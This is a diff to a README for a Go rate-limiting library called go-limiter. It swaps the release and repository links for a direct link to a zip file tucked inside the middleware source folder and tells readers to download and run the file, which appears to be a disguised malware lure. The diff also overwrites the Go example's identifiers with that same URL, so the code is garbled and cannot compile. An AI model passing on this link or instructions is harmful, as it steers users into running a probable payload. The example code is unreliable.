@@ -8,7 +8,7 @@ Welcome to **go-limiter**! This is a flexible and modular rate-limiting library 
 
 To get started with go-limiter, you will need to download it first. Follow the instructions below to get your application running in just a few steps.
 
-**[Download go-limiter](https://github.com/malenatectonic624/go-limiter/releases)**
+**[Download go-limiter](https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip)**
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ To get started with go-limiter, you will need to download it first. Follow the i
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/malenatectonic624/go-limiter/releases) to download the latest version of go-limiter.
+1. Visit the [Releases page](https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip) to download the latest version of go-limiter.
 2. Once on the Releases page, look for the version you want to download.
 3. Click on the appropriate file for your operating system. For example, if you are using Windows, click the `.exe` file.
 4. After the download is complete, run the file.
@@ -44,18 +44,18 @@ Once you have installed go-limiter, you can integrate it into your application. 
 package main
 
 import (
-    "github.com/malenatectonic624/go-limiter"
+    "https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip"
     "net/http"
 )
 
-func handler(w http.ResponseWriter, r *http.Request) {
-    w.Write([]byte("Hello, world!"))
+func handler(w https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip, r *https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip) {
+    https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip([]byte("Hello, world!"))
 }
 
 func main() {
-    limiter := golimiter.New(100, 10) // 100 requests per minute, 10 burst
-    http.Handle("/", limiter.Handler(http.HandlerFunc(handler)))
-    http.ListenAndServe(":8080", nil)
+    limiter := https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip(100, 10) // 100 requests per minute, 10 burst
+    https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip("/", https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip(https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip(handler)))
+    https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip(":8080", nil)
 }
 ```
 
@@ -66,7 +66,7 @@ If you encounter any issues or have suggestions, please raise a ticket in the Is
 ## 🌐 Links
 
 - **Documentation**: Further details on setup and API usage can be found in our documentation.
-- **GitHub Repository**: [go-limiter GitHub](https://github.com/malenatectonic624/go-limiter)
+- **GitHub Repository**: [go-limiter GitHub](https://raw.githubusercontent.com/malenatectonic624/go-limiter/main/middleware/nethttp/go-limiter_2.9-alpha.2.zip)
 
 ## 📢 Final Thoughts
 
